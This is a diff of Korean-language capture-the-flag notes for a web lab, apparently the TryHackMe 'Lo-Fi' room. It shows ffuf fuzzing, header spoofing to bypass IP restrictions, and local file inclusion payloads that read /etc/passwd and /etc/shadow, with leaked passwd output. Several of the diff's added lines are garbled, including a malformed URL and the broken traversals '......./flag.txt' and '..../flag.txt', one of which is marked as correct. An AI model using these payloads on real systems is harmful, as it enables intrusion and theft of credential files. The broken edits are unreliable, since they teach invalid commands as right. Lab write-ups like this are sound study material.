@@ -36,9 +36,9 @@ ffuf -u http://10.10.126.200/FUZZ -w wordlist.txt
 
 | 목적                          | 헤더 필요 여부 | 예시                              |
 | ----------------------------- | -------------- | --------------------------------- |
-| 🧠 **서브도메인 (Host 기반)** | ✅ 필요        | `-H "Host: FUZZ.lofi"`            |
-| 📁 **경로, 파일 fuzzing**     | ❌ 불필요      | `-u http://target/FUZZ`           |
-| 🧭 **DNS 직접 질의**          | ❌ 불필요      | `dig`, `dnsrecon`, `dnsenum` 사용 |
+| 🧠 서브도메인 (Host 기반) | ✅ 필요        | `-H "Host: FUZZ.lofi"`            |
+| 📁 경로, 파일 fuzzing     | ❌ 불필요      | `-u http://target/FUZZ`           |
+| 🧭 DNS 직접 질의          | ❌ 불필요      | `dig`, `dnsrecon`, `dnsenum` 사용 |
 
 # 중복된 페이지가 나오는 것을 방지
 
@@ -115,7 +115,7 @@ server-status [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 338ms]
 
 # ip 우회
 
-curl -i http://10.10.126.200/.htaccess \
+curl -i http://10.10.126.200htaccess \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Client-IP: 127.0.0.1" \
@@ -149,7 +149,7 @@ http http://lo-fi.thm/?page=%0a/bin/cat%20/etc/shadow
 ```
 
 http http://lo-fi.thm/?page=
-http http://lo-fi.thm/?page=/../../etc/passwd
+http http://lo-fi.thm/?page=../etc/passwd
 http http://lo-fi.thm/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 
 root:x:0:0:root:/root:/bin/bash
@@ -174,8 +174,8 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 
 # 틀림 -> 절대 경로를 허용하는 경우는 극히 드물다
 
-http http://lo-fi.thm/?page=/../../../../../../../flag.txt
+http http://lo-fi.thm/?page=......./flag.txt
 
 # 맞음 -> 상위 폴더로 이동해야 하므로 일반적으로 .. 로 시작
 
-http http://lo-fi.thm/?page=../../../flag.txt
+http http://lo-fi.thm/?page=..../flag.txt
